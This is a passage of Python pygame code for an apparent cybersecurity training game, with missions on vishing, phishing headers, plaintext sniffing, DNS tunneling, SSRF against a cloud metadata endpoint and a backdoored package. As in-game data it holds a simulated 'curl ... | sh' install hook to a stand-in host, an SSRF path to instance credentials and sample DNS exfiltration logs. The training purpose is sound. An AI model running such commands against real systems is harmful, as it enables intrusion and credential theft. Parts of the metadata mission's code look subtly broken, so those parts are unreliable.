                ok=(e.key-pygame.K_1)==q["a"]
                if ok: s.correct+=1
                sfx("ok" if ok else "bad"); s.feedback=ok
        elif s.phase=="reset" and e.key in (pygame.K_RETURN,pygame.K_SPACE):
            s.finished=True
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: THE OVERSHARE  (OSINT)",s.game.score)
        if s.phase=="quiz":
            sf.blit(F_S.render("TARGET: Rex Mallow (CrumbCorp) -- public feed. read, then answer.",True,GRAY),(60,60))
            fb=pygame.Rect(60,84,430,H-140)
            pygame.draw.rect(sf,(9,20,11),fb); pygame.draw.rect(sf,MDIM,fb,2)
            sf.blit(F_S.render("@rexmallow -- social feed",True,CYAN),(fb.x+10,fb.y+6))
            y=fb.y+30
            for i,p in enumerate(OSINT_POSTS):
                t,post=p[0],p[1]
                sf.blit(F_T.render(f"[{i+1}] {t:<4}",True,GRAY),(fb.x+8,y))
                wl=wrap(post,F_T,340)
                draw_lines(sf,wl,F_T,PALE,fb.x+70,y,17)
                y+=max(20,len(wl)*17)+6
            q=OSINT_QS[s.qi]
            qb=pygame.Rect(510,84,W-570,330)
            pygame.draw.rect(sf,(10,24,13),qb); pygame.draw.rect(sf,CYAN,qb,2)
            draw_lines(sf,wrap(q["q"],F_M,qb.w-40),F_M,PALE,qb.x+18,qb.y+14,24)
            y=qb.y+100
            for i,opt in enumerate(q["opts"]):
                sf.blit(F_M.render(f"[{i+1}] {opt}",True,GREEN),(qb.x+24,y)); y+=34
            if s.feedback is not None:
                c2=GREEN if s.feedback else RED
                sf.blit(F_M.render("CORRECT!" if s.feedback else "WRONG!",True,c2),(qb.x+18,qb.bottom-120))
                draw_lines(sf,wrap(q["why"],F_S,qb.w-40),F_S,PALE,qb.x+18,qb.bottom-92,18)
            else:
                sf.blit(F_S.render(f"question {s.qi+1}/3    correct: {s.correct}",True,YELLOW),(qb.x+18,qb.bottom-36))
        else:
            sf.blit(F_B.render("ACCOUNT RECOVERY :: RESET LINK SENT",True,RED),(60,120))
            draw_lines(sf,["You just took over a man's accounts. You never touched an exploit,",
                          "a CVE, or a terminal. His own posts answered every 'secret' question.",
                          "","Random answers in a password manager. 2FA on. Privacy settings up.",
                          "Assume anything posted is public -- because it is."],F_M,PALE,60,180,26)
            if blink_on(): sf.blit(F_S.render("[ENTER] debrief",True,YELLOW),(60,340))
        s.radio.draw(sf,H-58)

SOCIAL_NODES={
 "start":dict(lines=["INCOMING CALL -- UNKNOWN NUMBER ...","",
   "DAVE: \"Dave from IT. Breach alert on YOUR machine -- emergency patch",
   " in the next 10 minutes or you LOSE EMAIL ACCESS.\"","",
   "DAVE: \"Quick verification: what's your username?\""],
  opts=[("Tell him your username",5,"ask_pw","You taught the caller you answer questions under pressure."),
   ("\"How do I verify you? I'll call the helpdesk number on the portal.\"",0,"verify","TEXTBOOK. A callback to a number YOU look up kills vishing dead."),
   ("\"We have no breach alert. Goodbye.\" [hang up]",0,"hangup","Safe! But unreported attempts mean the next victim falls.")]),
 "ask_pw":dict(lines=["DAVE: \"Perfect. Now the password so I can push the patch.\""],
  opts=[("Read him the password",60,"burn","That's the whole kingdom. NEVER."),
   ("\"IT never asks for passwords. I'm calling the helpdesk now.\"",0,"verify","You quoted policy AND offered to verify."),
   ("\"What's your badge number and manager's name?\"",0,"probe","Flip it: make the CALLER prove identity.")]),
 "probe":dict(lines=["DAVE: \"Uh... badge 4411...\"","Portal says: facilities, on leave.","",
   "You report it. The SOC confirms a vishing wave hitting 30 staff."],end=dict(result="win",earned=120)),
 "verify":dict(lines=["DAVE: \"The-- the helpdesk?\"  *click*","Real helpdesk: \"Dave? No ticket. No breach alert.\""],
  end=dict(result="win",earned=120)),
 "hangup":dict(lines=["You hang up. No harm -- this time.","(The crew just dialed your 40 coworkers, though.)"],
  end=dict(result="half",earned=60)),
 "burn":dict(lines=["DAVE: \"Thanks!\"  *click*","11 minutes later your account emails 4,000 phishing messages.","",
   "Good news: this is a SIMULATION. Build the habit instead."],end=dict(result="fail",earned=0)),
}
class MissionSocial(Mission):
    def __init__(s,game):
        s.game=game; s.node,s.leak="start",0
        s.feedback,s.phase=None,"talk"; s.pending_next=None
        s.finished,s.passed,s.earned=False,False,0
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        nd=SOCIAL_NODES[s.node]
        if s.phase=="talk":
            if pygame.K_1<=e.key<=pygame.K_3 and e.key-pygame.K_1<len(nd["opts"]):
                txt,delta,nxt,fb=nd["opts"][e.key-pygame.K_1]
                s.leak=min(100,s.leak+delta); s.feedback=fb; s.pending_next=nxt
                s.phase="feedback"; sfx("bad" if delta else "tick")
        elif s.phase=="feedback" and e.key in (pygame.K_SPACE,pygame.K_RETURN):
            s.node=s.pending_next; s.phase="talk"; s.feedback=None
            if "end" in SOCIAL_NODES[s.node]:
                end=SOCIAL_NODES[s.node]["end"]
                s.earned=end["earned"]; s.passed=end["result"]!="fail"; s.finished=True
                if s.leak==0: s.game.achieve("unlisted")
                s.game.achieve("first_blood")
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: HUMAN FIREWALL",s.game.score)
        nd=SOCIAL_NODES[s.node]
        sf.blit(F_S.render("INFO LEAKED",True,PALE),(60,66))
        r=pygame.Rect(180,68,220,14); pygame.draw.rect(sf,(30,30,30),r)
        col=GREEN if s.leak<20 else YELLOW if s.leak<60 else RED
        pygame.draw.rect(sf,col,(r.x,r.y,int(r.w*s.leak/100),r.h)); pygame.draw.rect(sf,MDIM,r,1)
        panel=pygame.Rect(60,96,W-120,300)
        pygame.draw.rect(sf,(10,24,13),panel); pygame.draw.rect(sf,MDIM,panel,2)
        draw_lines(sf,nd["lines"],F_S,PALE,panel.x+18,panel.y+14,22)
        if s.phase=="talk" and "opts" in nd:
            y=424
            for i,(txt,_d,_n,_f) in enumerate(nd["opts"]):
                sf.blit(F_M.render(f"[{i+1}] {txt}",True,GREEN if _d==0 else RED),(70,y)); y+=34
        elif s.phase=="feedback" and s.feedback:
            box=pygame.Rect(140,430,W-280,90); pygame.draw.rect(sf,YELLOW,box,2)
            draw_lines(sf,wrap(s.feedback,F_S,box.w-30),F_S,YELLOW,box.x+15,box.y+10,20)
            sf.blit(F_S.render("SPACE: continue",True,GRAY),(box.right-160,box.bottom-26))

ENVELOPES=[
 dict(frm="Fiona Frost <ceo@frostedbytes.com>",subj="URGENT: approve emergency gift cards",
  body="I'm in meetings. Buy 8 x $100 gift cards and email the codes.\nDon't loop in anyone else.\n\n-- Fiona, CEO",
  headers=["Received: from mail.v0idrat-cdn.com (198.51.100.66)","Return-Path: <bounce@v0idrat-cdn.com>",
   "Authentication-Results:","  spf=fail (IP not authorized) smtp.mailfrom=v0idrat-cdn.com;",
   "  dkim=none (no signature);","  dmarc=fail action=quarantine header.from=frostedbytes.com"],
  phish=True,explain="SPF=FAIL: that server has no right to speak for frostedbytes.com.\nDKIM=NONE. DMARC=FAIL. The display name says CEO; the headers say v0idrat."),
 dict(frm="Bakery Guild News <news@bakersguild.example>",subj="March newsletter",
  body="March expo tickets are 20% off until Friday...\n\nUnsubscribe anytime.",
  headers=["Received: from forwarder.guildlists.example","Authentication-Results:",
   "  spf=softfail (forwarder not listed) smtp.mailfrom=bakersguild.example;",
   "  dkim=pass (2048-bit) header.d=bakersguild.example;","  dmarc=pass (p=none)"],
  phish=False,explain="The tricky one! SPF=SOFTFAIL because a FORWARDER relayed it -- but\nDKIM=PASS (signatures survive forwarding) and DMARC=PASS. Read them TOGETHER."),
 dict(frm="Payroll Update <hr-portal@frostedbytes-benefits.com>",subj="Action required: new payroll portal",
  body="Re-enter your direct-deposit details at\nhttp://frostedbytes-benefits.com/portal before Friday.",
  headers=["Received: from mail.frostedbytes-benefits.com (198.51.100.90)","Authentication-Results:",
   "  spf=pass (sender authorized for frostedbytes-benefits.com);",
   "  dkim=pass header.d=frostedbytes-benefits.com;","  dmarc=pass (p=none)"],
  phish=True,explain="Every check PASSES -- for frostedbytes-BENEFITS.com. They BOUGHT a\nlookalike domain. Auth proves origin, NOT trustworthiness. Classic BEC.")]
class MissionEnvelope(Mission):
    def __init__(s,game):
        s.game=game; s.i=0; s.show_head=False; s.correct=0
        s.feedback=None; s.phase="view"
        s.finished,s.passed,s.earned=False,False,0
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.phase=="fb":
            if e.key in (pygame.K_SPACE,pygame.K_RETURN):
                s.feedback=None; s.i+=1
                if s.i>=len(ENVELOPES):
                    s.earned=40*s.correct+(20 if s.correct==3 else 0)
                    s.passed=s.correct>=2; s.finished=True
                    s.game.achieve("first_blood")
                else: s.show_head=False; s.phase="view"
            return
        em=ENVELOPES[s.i]
        if e.key==pygame.K_LEFT: s.i=(s.i-1)%len(ENVELOPES); s.show_head=False
        elif e.key==pygame.K_RIGHT: s.i=(s.i+1)%len(ENVELOPES); s.show_head=False
        elif e.key==pygame.K_h: s.show_head=not s.show_head
        elif e.key in (pygame.K_1,pygame.K_2):
            ok=(e.key==pygame.K_2)==em["phish"]
            if ok: s.correct+=1
            sfx("ok" if ok else "bad"); s.feedback=(ok,em); s.phase="fb"
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: THE FORGED ENVELOPE",s.game.score)
        em=ENVELOPES[s.i]
        sf.blit(F_S.render(f"EMAIL {s.i+1}/3   [LEFT/RIGHT] switch   [H] {'body' if s.show_head else 'raw headers'}   "
                           f"correct: {s.correct}",True,GRAY),(60,62))
        panel=pygame.Rect(60,90,W-120,440)
        pygame.draw.rect(sf,(10,24,13),panel); pygame.draw.rect(sf,MDIM,panel,2)
        if not s.show_head:
            sf.blit(F_S.render("FROM:    "+em["frm"],True,PALE),(panel.x+16,panel.y+12))
            sf.blit(F_S.render("SUBJECT: "+em["subj"],True,YELLOW),(panel.x+16,panel.y+36))
            pygame.draw.line(sf,(20,45,25),(panel.x+10,panel.y+64),(panel.right-10,panel.y+64))
            draw_lines(sf,wrap(em["body"],F_S,panel.w-40),F_S,PALE,panel.x+16,panel.y+80,21)
            sf.blit(F_S.render("(the view the attacker wants -- press H)",True,GRAY),(panel.x+16,panel.bottom-26))
        else:
            y=panel.y+12
            for ln in em["headers"]:
                col=YELLOW if any(k in ln for k in ("spf=","dkim=","dmarc=")) else CYAN if ln.startswith("Authentication") else PALE
                sf.blit(F_T.render(ln,True,col),(panel.x+14,y)); y+=20
            sf.blit(F_S.render("(headers don't lie)",True,GRAY),(panel.x+14,panel.bottom-26))
        sf.blit(F_M.render("[1] LEGITIMATE          [2] PHISHING",True,GREEN),(60,552))
        if s.phase=="fb":
            ok,em2=s.feedback
            ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,165)); sf.blit(ov,(0,0))
            box=pygame.Rect(120,150,W-240,360)
            pygame.draw.rect(sf,(10,24,13),box); pygame.draw.rect(sf,GREEN if ok else RED,box,3)
            sf.blit(F_B.render("GOOD CATCH!" if ok else "MISSED IT!",True,GREEN if ok else RED),(box.x+24,box.y+14))
            draw_lines(sf,wrap(em2["explain"],F_S,box.w-60),F_S,PALE,box.x+24,box.y+64,20)
            sf.blit(F_S.render("SPACE: next",True,YELLOW),(box.x+24,box.bottom-32))

PACKETS=[
 ("12:03:41.455","TCP","10.0.0.15:51022 > 10.0.0.20:21  SYN  [FTP]","plain FTP control channel opening..."),
 ("12:03:41.501","FTP","USER brenda","a username crossing the wire as text."),
 ("12:03:41.530","FTP","PASS croissant42","*** PASSWORD IN PLAINTEXT *** press P to submit"),
 ("12:03:41.544","FTP","230 login ok","brenda is in. everyone on this LAN saw it."),
 ("12:03:42.011","TLS","10.0.0.15 > 10.0.0.20:443  ClientHello sni=filesrv.fb.com","handshake: server NAME visible, nothing else."),
 ("12:03:42.201","TLS","AppData  <<7f 3a 9c d1 44 e2 ...>>","encrypted payload. capture != read."),
 ("12:03:43.801","TEL","gumdrop9","*** TELNET PASSWORD IN PLAINTEXT ***"),
 ("12:03:44.210","ARP","10.0.0.1 is-at aa:bb:cc:00:11:22","the REAL gateway MAC. memorize it."),
 ("12:03:44.480","ARP","10.0.0.1 is-at de:ad:be:ef:00:66  <<DUPLICATE IP, NEW MAC>>","ARP SPOOFING: someone is impersonating the router (MitM)."),
 ("12:03:45.100","HTTP","POST /login  user=dave&password=gumdrop9","HTTP login: readable... and greg REUSES passwords."),
 ("12:03:45.700","TLS","10.0.0.15 > 10.0.0.20:443  AppData <<b9 22 7e ...>>","TLS holds even on the poisoned ARP path.")]
PACKET_QUIZ=[
 dict(q="Q1 :: Why could we read brenda's FTP login?",
      opts=["FTP servers broadcast passwords","FTP is plaintext -- credentials cross the wire unencrypted",
            "She typed slowly","The switch forwarded it to us"],a=1,
      why="FTP/Telnet/HTTP carry credentials in the clear. Anyone on the path reads everything."),
 dict(q="Q2 :: Why couldn't we read the TLS payloads?",
      opts=["Compressed","TLS encrypts payload with session keys from the handshake",
            "Server blocked our MAC","Different wire"],a=1,
      why="Handshake visible (name, cert), payload sealed. Capture is not read."),
 dict(q="Q3 :: Two ARP replies for the gateway with DIFFERENT MACs means...",
      opts=["Two NICs, fine","ARP spoofing -- a man in the middle",
            "DNS misconfig","DHCP expired"],a=1,
      why="ARP has zero verification. Defend: Dynamic ARP Inspection, 802.1X."),
 dict(q="Q4 :: Best fix so neighbors can NEVER see logins?",
      opts=["Weekly password changes","Hide the WiFi name",
            "Encrypt in transit everywhere: SFTP/SSH/HTTPS only","MAC filtering"],a=2,
      why="Protocols encrypt packets, policies don't. Assume the wire is hostile.")]
class MissionPackets(Mission):
    VIEW=22
    def __init__(s,game):
        s.game=game; s.captured=[]; s.pkt_i=0; s.cap_t=0.4; s.capturing=True
        s.phase="live"; s.sel=0; s.inspect=None
        s.pw_input=False; s.pw_str=""; s.pw_done=False
        s.quiz=None
        s.finished,s.passed,s.earned=False,False,0
    def update(s,dt):
        if s.phase=="live" and s.capturing:
            s.cap_t-=dt
            if s.cap_t<=0:
                s.cap_t=0.30
                if s.pkt_i<len(PACKETS):
                    s.captured.append(PACKETS[s.pkt_i]); s.pkt_i+=1; sfx("tick")
                    if s.pkt_i>=len(PACKETS): s.capturing=False; s.phase="wire"
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.quiz:
            s.quiz.key(e.key); return
        if s.pw_input:
            if e.key==pygame.K_RETURN:
                if s.pw_str.strip().lower()=="croissant42":
                    s.pw_done=True; s.pw_input=False
                    s.quiz=QuizOverlay(PACKET_QUIZ,lambda c: s.finish(c)); sfx("win")
                else: s.pw_str=""; sfx("bad")
            elif e.key==pygame.K_ESCAPE: s.pw_input=False
            elif e.key==pygame.K_BACKSPACE: s.pw_str=s.pw_str[:-1]
            elif e.unicode and ord(e.unicode)>=32: s.pw_str+=e.unicode
            return
        can=s.phase=="wire"
        if e.key==pygame.K_SPACE and s.phase=="live": s.capturing=not s.capturing
        elif can and e.key==pygame.K_DOWN: s.sel=min(len(s.captured)-1,s.sel+1)
        elif can and e.key==pygame.K_UP: s.sel=max(0,s.sel-1)
        elif can and e.key==pygame.K_RETURN and 0<=s.sel<len(s.captured):
            s.inspect=None if s.inspect==s.sel else s.sel; sfx("ok")
        elif can and e.key==pygame.K_p and not s.pw_done: s.pw_input=True; s.pw_str=""
    def finish(s,c):
        s.earned=(100 if s.pw_done else 0)+30*c
        s.passed=s.pw_done and c>=2; s.finished=True
        s.game.achieve("first_blood")
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: GHOST ON THE WIRE",s.game.score)
        box=pygame.Rect(40,80,W-80,H-150)
        pygame.draw.rect(sf,(9,20,11),box); pygame.draw.rect(sf,MDIM,box,2)
        y=box.y+6
        lo=max(0,min(s.sel-18,max(0,len(s.captured)-s.VIEW)))
        for i in range(lo,min(len(s.captured),lo+s.VIEW)):
            t,p,txt,_=s.captured[i]
            mark=">>" if i==s.sel else "  "
            base=WHITE if i==s.sel else PROTO_COL.get(p,GRAY)
            sf.blit(F_T.render(f"{mark}{t} {p:<4} {txt[:78]}",True,base),(box.x+8,y)); y+=19
        if s.inspect is not None and 0<=s.inspect<len(s.captured):
            t,p,txt,detail=s.captured[s.inspect]
            ib=pygame.Rect(120,H-300,W-240,130)
            ov=pygame.Surface((W,H),pygame.SRCALPHA); ov.fill((0,0,0,120)); sf.blit(ov,(0,0))
            pygame.draw.rect(sf,(10,24,13),ib); pygame.draw.rect(sf,CYAN,ib,2)
            sf.blit(F_S.render(f"INSPECT [{p}]  {txt}",True,YELLOW),(ib.x+14,ib.y+10))
            draw_lines(sf,wrap(detail,F_S,ib.w-30),F_S,PALE,ib.x+14,ib.y+34,19)
        sf.blit(F_S.render("SPACE pause  UP/DOWN select  ENTER inspect  P submit FTP password",True,GRAY),(60,H-56))
        if s.pw_input:
            sf.blit(F_M.render("FTP PASSWORD > "+s.pw_str+("_" if blink_on(350) else " "),True,GREEN),(60,H-30))
        if s.quiz: s.quiz.draw(sf)

DNS_LINES=[
 "22:03:07 query[A] 41495247.exfil.v0idrat-cdn.com from 10.0.1.30",
 "22:03:12 query[A] 41502042.exfil.v0idrat-cdn.com from 10.0.1.30",
 "22:03:17 query[A] 52454143.exfil.v0idrat-cdn.com from 10.0.1.30",
 "22:03:23 query[A] 48204020.exfil.v0idrat-cdn.com from 10.0.1.30",
 "22:03:29 query[A] 30333030.exfil.v0idrat-cdn.com from 10.0.1.30",
 "22:03:15 answer portal.frostedbytes.com is 10.0.1.50 ttl=300",
 "02:47:10 forwarded portal.frostedbytes.com is 198.51.100.66 ttl=86400",
 "02:47:12 cached 198.51.100.66 served to 3 more clients",
 "03:00:00 traffic spike: portal.frostedbytes.com = 198.51.100.66"]
DNS_QUIZ=[
 dict(q="Q1 :: Long hex subdomains under exfil.* from one host are...",
      opts=["A CDN","IPv6 labels","DNS tunneling -- data smuggled in queries","DNSSEC rotation"],a=2,
      why="Data in labels, beaconed to a controlled domain. Egress DNS via logged resolvers."),
 dict(q="Q2 :: portal got TWO answers: 10.0.1.50 ttl=300 and 198.51.100.66 ttl=86400. This is...",
      opts=["Load balancing","Round-robin","DNS cache poisoning","Timezone glitch"],a=2,
      why="A forged answer with a giant TTL got cached. Defend: DNSSEC, DoH/DoT."),
 dict(q="Q3 :: Best defense against both?",
      opts=["Ban DNS","Shorter DHCP leases","Approved+logged resolvers, weird-label alerts, DNSSEC","More RAM"],a=2,
      why="Control egress, log it, sign integrity.")]
class MissionDNS(Mission):
    def __init__(s,game):
        s.game=game; s.sel=0; s.chunks=[]; s.decoded=None
        s.phase="read"; s.quiz=None
        s.finished,s.passed,s.earned=False,False,0
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.quiz:
            s.quiz.key(e.key); return
        if e.key==pygame.K_DOWN: s.sel=min(len(DNS_LINES)-1,s.sel+1)
        elif e.key==pygame.K_UP: s.sel=max(0,s.sel-1)
        elif e.key==pygame.K_g:
            m=re.search(r"([0-9a-f]{8})\.exfil",DNS_LINES[s.sel])
            if m and m.group(1) not in s.chunks:
                s.chunks.append(m.group(1)); sfx("ok2")
                if len(s.chunks)==5: s.game.achieve("spook")
            else: sfx("bad")
        elif e.key==pygame.K_d and len(s.chunks)==5 and not s.decoded:
            try: s.decoded="".join(bytes.fromhex(c).decode() for c in s.chunks)
            except Exception: s.decoded="??"
            sfx("win")
        elif e.key==pygame.K_RETURN and s.decoded:
            s.quiz=QuizOverlay(DNS_QUIZ,lambda c: s.finish(c)); sfx("ok")
    def finish(s,c):
        s.earned=80+30*c; s.passed=c>=2; s.finished=True
        s.game.achieve("first_blood")
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: THE LYING PHONEBOOK",s.game.score)
        rb=pygame.Rect(620,62,360,130)
        pygame.draw.rect(sf,(10,24,13),rb); pygame.draw.rect(sf,MDIM,rb,2)
        sf.blit(F_S.render(f"CHUNKS {len(s.chunks)}/5  [G] grab [D] decode",True,CYAN),(rb.x+10,rb.y+6))
        for i in range(5):
            ch=s.chunks[i] if i<len(s.chunks) else "????????"
            sf.blit(F_S.render(f"  {i+1}: {ch}",True,GREEN if i<len(s.chunks) else GRAY),(rb.x+10,rb.y+30+i*19))
        if s.decoded:
            sf.blit(F_M.render(f"> {s.decoded}",True,ORANGE),(rb.x+10,rb.bottom-26))
            sf.blit(F_S.render("[ENTER] quiz",True,YELLOW),(rb.right-110,rb.bottom-26))
        box=pygame.Rect(40,200,560,H-250)
        pygame.draw.rect(sf,(9,20,11),box); pygame.draw.rect(sf,MDIM,box,2)
        y=box.y+6
        for i,ln in enumerate(DNS_LINES):
            mark=">>" if i==s.sel else "  "
            sf.blit(F_T.render(f"{mark}{ln}",True,YELLOW if i==s.sel else PALE),(box.x+8,y)); y+=19
        sf.blit(F_S.render("UP/DOWN scroll  G grab hex  D decode  ENTER quiz",True,GRAY),(60,H-40))
        if s.quiz: s.quiz.draw(sf)

META_RESPONSES={
 "wiki.internal":["HTTP/1.1 200 OK  (fetched SERVER-SIDE via /preview)","<h1>Lighthouse HR</h1>  holiday schedule: never",
   "","[!] the preview server fetched an INTERNAL host for you.","    that's SSRF -- your request became the server's request."],
 "admin.internal:9090":["HTTP/1.1 200 OK",":: ADMIN PANEL ::   build jobs | secrets | deploy keys","","[!] 'internal-only' is not a boundary --","    the server is a willing proxy into the intranet."],
 "169.254.169.254":["ami-id: ami-0c4f5e11","instance-id: i-0d3adb33f","hostname: ci-runner-03","","[!] link-local metadata service reachable from INSIDE.","    the real prize needs the iam/ path..."],
 "CRED":["{","  \"AccessKeyId\": \"AKIALIGHTHOUSETEMP1\",","  \"SecretAccessKey\": \"wJalrXUtnFEMIfake/K7MDENGbPxRfiCY\",",
   "  \"Token\": \"AQoDYH2...==\",","  \"Expiration\": \"2025-03-15T04:11:00Z\"","}","","[!] TEMPORARY IAM ROLE CREDENTIALS, handed to any script","    that can say hello to link-local. game over in the real world."],
}
class MissionMetadata(Mission):
    def __init__(s,game):
        s.game=game
        s.phase="browse"
        s.url=""; s.resp=[]; s.got_creds=False; s.got_token=False
        s.fixes=set(); s.replay=[]
        s.finished,s.passed,s.earned=False,False,0
        s.radio=Radio()
        s.radio.say(1.0,"KIP","the preview server fetches whatever URL you give it. ALL of them do.")
        s.radio.say(6.0,"PATCH","A feature is a door if you feed it the right address.")
    def fetch(s):
        u=s.url.strip().lower(); s.url=""; s.resp=[]
        if not u: return
        if "wiki.internal" in u: s.resp=list(META_RESPONSES["wiki.internal"]); sfx("ok")
        elif "admin.internal" in u: s.resp=list(META_RESPONSES["admin.internal:9090"]); sfx("ok")
        elif "169.254.169.254" in u and "security-credentials" in u:
            s.resp=list(META_RESPONSES["CRED"]); s.got_creds=True; s.phase="assume"; sfx("win")
            s.radio.say(0.5,"KIP","TEMPORARY CLOUD KEYS. from a LINK PREVIEW. i need to sit down.")
        elif "169.254.169.254" in u: s.resp=list(META_RESPONSES["169.254.169.254"]); sfx("ok")
        else: s.resp=["preview: fetch failed (NXDOMAIN / refused)","","(internal DNS only resolves .internal and the metadata IP)"]; sfx("tick")
    def assume(s):
        if not s.got_token:
            s.got_token=True
            s.resp=["[sts:AssumeRole with stolen creds -- OK]","","s3 ls:",
             "  lighthouse-backups      (private)",
             "  lighthouse-staging      (read: role)",
             "    -> ci-bot.token   <-- grab it","","[ENTER] exfiltrate ci-bot.token"]
            sfx("ok2")
        else:
            s.resp=["[+] exfiltrated: ci-bot.token (ORION's CI credentials)","","now FIX the service so nobody does this to you:",
             "  [1] IMDSv2 (metadata needs a session token header)",
             "  [2] egress allowlist for the preview feature",
             "  [3] scope the role down to ONE bucket","","toggle 1-3, then [ENTER] re-run your attack."]
            s.phase="fix"; sfx("win")
    def rerun(s):
        s.replay=[]
        ok1,ok2,ok3="1" in s.fixes,"2" in s.fixes,"3" in s.fixes
        s.replay.append(("replaying your own attack chain ...",PALE))
        s.replay.append(("step 1 (internal fetch): "+("BLOCKED -- egress allowlist" if ok2 else "STILL WORKS"),GREEN if ok2 else RED))
        s.replay.append(("step 2 (metadata read):  "+("BLOCKED -- IMDSv2 token required" if ok1 else "STILL WORKS"),GREEN if ok1 else RED))
        s.replay.append(("step 3 (role abuse):     "+("BLOCKED -- role can only read one bucket" if ok3 else "STILL WORKS"),GREEN if ok3 else RED))
        if ok1 and ok2 and ok3:
            s.earned=210; s.passed=True; s.phase="done"; sfx("win")
            s.game.achieve("janitor")
            s.replay.append(("CHAIN DEAD. all three fixes required. (+210)",ORANGE))
        else:
            sfx("bad"); s.earned=max(s.earned,60); s.passed=False
            s.replay.append(("partial fix -- every layer matters. toggle more and re-run.",YELLOW))
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.phase=="browse":
            if e.key==pygame.K_RETURN: s.fetch()
            elif e.key==pygame.K_BACKSPACE: s.url=s.url[:-1]; sfx("key")
            elif e.unicode and ord(e.unicode)>=32 and len(s.url)<60: s.url+=e.unicode; sfx("key")
        elif s.phase=="assume":
            if e.key in (pygame.K_RETURN,pygame.K_SPACE): s.assume()
        elif s.phase=="fix":
            if e.key in "123": s.fixes.symmetric_difference_update({e.key}); sfx("tick")
            elif e.key==pygame.K_RETURN: s.rerun()
        elif s.phase=="done" and e.key in (pygame.K_RETURN,pygame.K_SPACE):
            s.finished=True; s.game.achieve("first_blood")
    def update(s,dt): s.radio.update(dt)
    def draw(s,sf):
        sf.fill(BG); header(sf,"TRAINING :: THE METADATA MIRROR  (dev portal /preview)",s.game.score)
        sf.blit(F_S.render("URL > "+s.url+("_" if blink_on(350) and s.phase=="browse" else " "),True,GREEN),(60,64))
        sf.blit(F_S.render("ENTER fetch   targets: wiki.internal | admin.internal:9090 | 169.254.169.254",True,GRAY),(60,92))
        rb=pygame.Rect(60,120,W-120,H-260)
        pygame.draw.rect(sf,(9,20,11),rb); pygame.draw.rect(sf,MDIM,rb,2)
        y=rb.y+8
        lines=s.replay if s.replay else s.resp
        for t,c in lines:
            if t: sf.blit(F_S.render(t[:96],True,c),(rb.x+12,y)); y+=21
        if s.phase=="assume" and not s.got_token:
            sf.blit(F_S.render("[ENTER] assume the stolen role",True,YELLOW),(60,rb.bottom+10))
        elif s.phase=="assume":
            sf.blit(F_S.render("[ENTER] exfiltrate",True,YELLOW),(60,rb.bottom+10))
        if s.phase in ("fix","done"):
            fp=pygame.Rect(60,rb.bottom+8,W-120,70)
            pygame.draw.rect(sf,(10,24,13),fp); pygame.draw.rect(sf,MDIM,fp,2)
            for j,t in enumerate(["[1] IMDSv2","[2] egress allowlist","[3] least-priv role"]):
                on=(str(j+1) in s.fixes)
                sf.blit(F_M.render(t,True,GREEN if on else GRAY),(fp.x+16+j*230,fp.y+8))
            sf.blit(F_S.render("ENTER = re-run your attack against the fixes" if s.phase=="fix" else "FIXED. [ENTER] debrief",True,YELLOW),(fp.x+16,fp.y+38))
        s.radio.draw(sf,H-58)

_BASE="9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"
def _mut(s_,i,ch): return s_[:i]+ch+s_[i+1:]
CHECK_PKGS=[
 dict(name="requests 2.31.0",claimed=_BASE,actual=_BASE,backdoor=False),
 dict(name="pyyaml 6.0.1",claimed=_BASE,actual=_mut(_mut(_BASE,9,"a"),31,"f"),backdoor=True),
 dict(name="flask 3.0.0",claimed=_BASE,actual=_BASE,backdoor=False),
 dict(name="colorama 0.4.6",claimed=_BASE,actual=_BASE,backdoor=False),
 dict(name="jinja2 3.1.3",claimed=_BASE,actual=_BASE,backdoor=False)]
TYPOS=["requests","rquests","python-dateutil","python3-requestx","colorama","coloraama"]
TYPO_BAD={1,3,5}
class MissionChecksum(Mission):
    def __init__(s,game):
        s.game=game; s.phase="hash"
        s.quar=set(); s.toggles=set(); s.log=[]
        s.bd_installed=False; s.typo_ok=0; s.typo_false=0
        s.finished,s.passed,s.earned=False,False,0
        s.radio=Radio()
        s.radio.say(1.0,"KIP","our CI is hungry. feed it CAREFULLY.")
        s.radio.say(5.0,"PATCH","Verify everything. Even us. Especially us.")
    def install(s):
        s.log=[]
        for i,p in enumerate(CHECK_PKGS):
            if i in s.quar:
                s.log.append(f"QUARANTINED: {p['name']} (held for review)"); continue
            if p["backdoor"]:
                s.bd_installed=True
                s.log.append(f"INSTALLED: {p['name']}  [hash matched claim -- but wait...]")
                s.log.append("post-install hook: curl -s http://v0id-cdn.example/x.sh | sh")
                s.log.append("!!! BACKDOOR INSIDE THE BUILD PIPELINE !!!")
                sfx("bad")
            else:
                s.log.append(f"INSTALLED: {p['name']}  OK")
        if not s.bd_installed: sfx("ok2"); s.log.append("CI green. for now.")
        s.phase="typo"
    def confirm(s):
        s.typo_ok=len(s.toggles&TYPO_BAD); s.typo_false=len(s.toggles-TYPO_BAD)
        for i in sorted(s.toggles):
            s.log.append(("FLAGGED: " if i in TYPO_BAD else "FALSE ALARM: ")+TYPOS[i])
        s.log.append(f"typosquats caught: {s.typo_ok}/3   false accusations: {s.typo_false}")
        s.passed=(not s.bd_installed) and s.typo_ok>=2 and s.typo_false<=1
        s.earned=max(0,50+20*s.typo_ok-15*s.typo_false-(80 if s.bd_installed else 0))
        if s.passed and s.typo_ok==3 and s.typo_false==0:
            s.game.achieve("mason"); s.earned+=30
        s.game.achieve("first_blood")
        s.phase="done"
    def handle_event(s,e):
        if e.type!=pygame.KEYDOWN: return
        if s.phase=="hash":
            if pygame.K_1<=e.key<=pygame.K_5:
                s.quar.symmetric_difference_update({e.key-pygame.K_1}); sfx("tick")
            elif e.key==pygame.K_RETURN: s.install()
        elif s.phase=="typo":
            if pygame.K_1<=e.key<=pygame.K_6:
                s.toggles.symmetric_difference_update({e.key-pygame.K_1}); sfx("tick")
            elif e.key==pygame.K_RETURN: s.confirm()
